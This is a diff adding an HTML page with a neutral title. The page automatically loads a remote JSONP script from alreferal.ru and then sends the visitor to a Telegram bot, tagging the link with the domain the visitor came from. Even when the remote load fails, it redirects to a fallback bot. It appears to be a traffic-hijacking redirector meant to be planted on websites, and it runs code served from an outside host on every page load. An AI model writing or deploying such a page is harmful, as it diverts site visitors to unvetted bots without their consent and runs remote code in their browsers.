@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dynamic Script Load with Error Handling</title>
+</head>
+<body>
+  <script>
+    // Переменная для имени бота, если его удастся получить
+    let botName = null;
+    let isCallbackCalled = false;  // Флаг для отслеживания вызова callback
+
+    // Callback-функция JSONP, которая должна быть вызвана сервером
+    function myCallback(name) {
+      if (name) {
+        botName = name;
+        isCallbackCalled = true;  // Устанавливаем флаг, если callback вызван
+        redirectToTelegram(botName);
+      } else {
+        console.error("Ошибка: имя бота не получено.");
+        handleRedirectFallback();
+      }
+    }
+
+    // Функция для редиректа на Telegram с использованием botName
+    function redirectToTelegram(botName) {
+      const params = new URLSearchParams(window.location.search);
+      let domain = params.get('domain');
+
+      if (!domain) {
+        console.warn("Параметр 'domain' не найден в URL, используем имя бота.");
+        domain = botName || 'default_bot_name';
+      } else {
+        domain = domain.replace(/\./g, '_');
+        domain = `site_${domain}`;
+      }
+
+      const urlRedirect = `https://t.me/${botName}/?start=${domain}`;
+      window.location.href = urlRedirect;
+    }
+
+    // Функция для обработки резервного редиректа на случай ошибки
+    function handleRedirectFallback() {
+      if (!botName) {
+        botName = 'default_bot_name';
+      }
+      redirectToTelegram(botName);
+    }
+
+    // Динамически загружаем скрипт JSONP с обработкой ошибки
+    const script = document.createElement('script');
+    script.src = 'https://alreferal.ru/get_random_bot_hash.php?hash_id=03f5652911133e62454158a3ee6294de86d9de7629e5e13a8e00f24084cec0bb&callback=myCallback';
+    script.onerror = function() {
+      console.error("Ошибка загрузки JSONP скрипта.");
+      handleRedirectFallback();
+    };
+
+    // Добавляем скрипт в DOM
+    document.body.appendChild(script);
+
+    // Таймер для отслеживания вызова callback
+    setTimeout(() => {
+      if (!isCallbackCalled) {
+        console.warn("Callback не вызван, выполняем резервный редирект.");
+        handleRedirectFallback();
+      }
+    }, 2000);  // Ждем 2 секунды перед резервной обработкой
+  </script>
+</body>
+</html>
